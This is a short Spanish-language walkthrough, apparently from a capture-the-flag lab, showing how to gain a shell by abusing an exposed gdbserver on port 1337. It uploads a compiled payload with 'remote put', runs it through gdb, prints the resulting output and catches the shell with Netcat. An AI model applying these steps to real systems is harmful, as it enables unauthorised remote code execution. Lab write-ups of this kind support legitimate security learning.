#### INICIAMOS EL PROGRAMA PARA HACER UN DEBBUGING

`$ gdb`

#### Una vez dentro vamos a mandar una conexion hacia el puerto 1337 y debugear algun backdoor

`$ target extended-remote 10.10.11.125:1337`

#### Creamos un script o programa compilado para crear la conexion remota desde el servidor y subirlo al servidor

`$ remote put pwn.elf venom.elf`

#### Declaramos que programa vamos a ejecutar en este caso vamos a usar venom.elf
`$ set remote exec-file venom.elf`

#### Ahora corremos el script
`$ run`

#### Saldra algo como esto

	Starting program: target:/usr/bin/true 
	Reading /lib64/ld-linux-x86-64.so.2 from remote target...
	Reading /lib64/ld-linux-x86-64.so.2 from remote target...
	Reading /lib64/ld-2.31.so from remote target...
	Reading /lib64/.debug/ld-2.31.so from remote target...
	Reading /usr/lib/debug//lib64/ld-2.31.so from remote target...
	Reading /usr/lib/debug/lib64//ld-2.31.so from remote target...
	Reading target:/usr/lib/debug/lib64//ld-2.31.so from remote target...
	process 64173 is executing new program: /usr/bin/dash
	Reading /usr/bin/dash from remote target...
	Reading /usr/bin/dash from remote target...

#### Al final tendremos la conexion a la escucha con Netcat y asi hackeamos el servidor


